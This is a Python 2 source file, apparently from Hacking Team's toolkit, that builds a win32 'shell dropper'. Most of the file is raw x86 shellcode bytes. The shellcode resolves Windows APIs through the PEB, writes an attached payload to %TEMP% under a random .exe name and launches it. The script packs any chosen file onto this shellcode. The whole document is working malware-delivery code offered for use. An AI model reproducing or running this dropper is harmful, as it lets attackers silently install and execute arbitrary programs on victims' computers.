#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

"""
Shellcode dropper
Drop in %TEMP% folder an attachment  file and run it

Parameters:
	length:DWORD		-> Size of attachment
	filename:BYTE[12]	-> File name to drop
	buffer:BYTE[?]		-> Attachment data

Shellcode available in source format in /shellcode/shelldrop/shelldrop.asm
"""

VERSION = "1.0"

NAME="x86shelldrop"
DESCRIPTION="x86 Shell Dropper for win32"
DOCUMENTATION={}
DOCUMENTATION["VENDOR"] = "HT srl"
DOCUMENTATION["Repeatability"] = "One shot"
DOCUMENTATION["Author"] = "cod"
DOCUMENTATION["Notes"] = ""

import os
import sys
import struct
from random import *

class x86shelldrop:

	shellcode = ""
	r = None
	
	"""
	initialize object (shellcode and Random object)
	"""
	def __init__(self):
		self.r = Random()
		self.r.seed()

		self.shellcode += "\xE8\x00\x00\x00\x00\x58\x2D\x05\x00\x00\x00\x8B\xEC\x83\xEC\x40"
		self.shellcode += "\x89\x45\xFC\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x70\x1C\xAD"
		self.shellcode += "\x8B\x40\x08\x89\x45\xF8\x8B\x48\x3C\x03\xC8\x8B\x49\x78\x03\xC8"
		self.shellcode += "\x51\xFF\x75\xF8\xE8\x58\x00\x00\x00\x89\x45\xF4\x8B\x5D\xFC\x89"
		self.shellcode += "\x45\xE0\xBB\x62\x01\x00\x00\x03\x5D\xFC\x8B\xF3\xB9\x06\x00\x00"
		self.shellcode += "\x00\x51\xAD\x03\x45\xFC\x50\xFF\x75\xF8\xE8\x99\x00\x00\x00\x59"
		self.shellcode += "\x8B\xD8\xAD\x03\xC5\x89\x18\xE2\xE8\xE9\x2C\x01\x00\x00\x51\x56"
		self.shellcode += "\x68\x64\x64\x72\x65\x68\x72\x6F\x63\x41\x68\x47\x65\x74\x50\x8B"
		self.shellcode += "\xF4\xB9\x03\x00\x00\x00\xF3\xA7\x0F\x94\xC0\x83\xC4\x0C\x5E\x59"
		self.shellcode += "\xC3\x55\x8B\xEC\x56\x51\x57\x8B\x75\x0C\x8B\x4E\x18\x03\x7D\x08"
		self.shellcode += "\x8B\x46\x20\x03\x45\x08\x33\xFF\x50\x57\x8B\x38\x03\x7D\x08\xE8"
		self.shellcode += "\xBA\xFF\xFF\xFF\x3C\x01\x5F\x58\x74\x08\x83\xC0\x04\x47\xE2\xE8"
		self.shellcode += "\xEB\x20\x03\x7E\x10\x8B\xCF\x8B\x7E\x24\x03\x7D\x08\x0F\xB7\x0C"
		self.shellcode += "\x4F\x2B\x4E\x10\x8B\x7E\x1C\x03\x7D\x08\x8B\x04\x8F\x03\x45\x08"
		self.shellcode += "\xEB\x0D\x33\xC0\x8B\xFC\xB9\x40\x00\x00\x00\xF3\xAB\xFF\xE0\x5F"
		self.shellcode += "\x59\x5E\x8B\xE5\x5D\xC2\x08\x00\xFF\x65\xE0\xFF\x65\xDC\xFF\x65"
		self.shellcode += "\xD8\xFF\x65\xD4\xFF\x65\xD0\xFF\x65\xCC\xFF\x65\xC8\x43\x72\x65"
		self.shellcode += "\x61\x74\x65\x46\x69\x6C\x65\x41\x00\x57\x72\x69\x74\x65\x46\x69"
		self.shellcode += "\x6C\x65\x00\x43\x6C\x6F\x73\x65\x48\x61\x6E\x64\x6C\x65\x00\x43"
		self.shellcode += "\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65\x73\x73\x41\x00\x47\x65"
		self.shellcode += "\x74\x45\x6E\x76\x69\x72\x6F\x6E\x6D\x65\x6E\x74\x56\x61\x72\x69"
		self.shellcode += "\x61\x62\x6C\x65\x41\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73"
		self.shellcode += "\x73\x00\x0D\x01\x00\x00\xDC\xFF\xFF\xFF\x19\x01\x00\x00\xD8\xFF"
		self.shellcode += "\xFF\xFF\x23\x01\x00\x00\xD4\xFF\xFF\xFF\x2F\x01\x00\x00\xD0\xFF"
		self.shellcode += "\xFF\xFF\x3E\x01\x00\x00\xCC\xFF\xFF\xFF\x56\x01\x00\x00\xC8\xFF"
		self.shellcode += "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x81\xEC\x00\x01\x00\x00"
		self.shellcode += "\x8B\xC4\xC7\x00\x54\x45\x4D\x50\xC7\x40\x04\x00\x00\x00\x00\x68"
		self.shellcode += "\xF8\x00\x00\x00\x50\x83\x04\x24\x08\x50\xE8\x48\xFF\xFF\xFF\x8B"
		self.shellcode += "\xFC\x83\xC7\x08\xB9\x00\x01\x00\x00\x33\xC0\xF2\xAE\xB0\x5C\x4F"
		self.shellcode += "\xAA\x8B\x5D\xFC\xB9\x03\x00\x00\x00\xBE\x75\x02\x00\x00\x03\xF3"
		self.shellcode += "\xF3\xA5\x32\xC0\x88\x07\x8B\xC4\x83\xC0\x08\x6A\x00\x6A\x00\x6A"
		self.shellcode += "\x02\x6A\x00\x6A\x00\x68\x00\x00\x00\x40\x50\xE8\xFB\xFE\xFF\xFF"
		self.shellcode += "\x89\x45\xF0\x6A\x00\x8B\xC4\x6A\x00\x50\xBE\x71\x02\x00\x00\x03"
		self.shellcode += "\xF3\xFF\x36\xBE\x81\x02\x00\x00\x03\xF3\x56\xFF\x75\xF0\xE8\xDB"
		self.shellcode += "\xFE\xFF\xFF\x83\xC4\x04\xFF\x75\xF0\xE8\xD3\xFE\xFF\xFF\x8B\xD4"
		self.shellcode += "\x83\xC2\x08\x83\xEC\x10\x8B\xDC\x83\xEC\x44\x8B\xFC\xB9\x0B\x00"
		self.shellcode += "\x00\x00\x33\xC0\xF3\xAB\x8B\xFC\xC7\x07\x44\x00\x00\x00\x53\x57"
		self.shellcode += "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x52\xE8"
		self.shellcode += "\xA0\xFE\xFF\xFF\x81\xC4\x54\x01\x00\x00\x6A\x00\xE8\x99\xFE\xFF"
		self.shellcode += "\xFF"
		
	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot exe)
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
		
		newfilename += struct.pack('cccc', '.', 'e', 'x', 'e')
		
		return newfilename
	
	"""
	attach a file to shellcode and return an array (binary string)
	"""
	def get(self, filename):
		outshellcode = self.shellcode
		
		sizeFILE = os.path.getsize(filename)
		FILE = open(filename, 'rb')
		outshellcode += struct.pack("L", sizeFILE)
		outshellcode += self.randfilename()
		outshellcode += FILE.read()
		
		FILE.close()
		
		return outshellcode
		
if __name__ == "__main__":
	print "x86 Shell Dropper/win32 platform"
	
	print "Loading file 1"
	
	myclass = x86shelldrop()
	
	print "Opening file ", sys.argv[1]
	outdata = myclass.get(sys.argv[1])
	
	outstream = open(sys.argv[2], 'wb')
	outstream.write(outdata)
	outstream.close()
	
	print "Block completed"
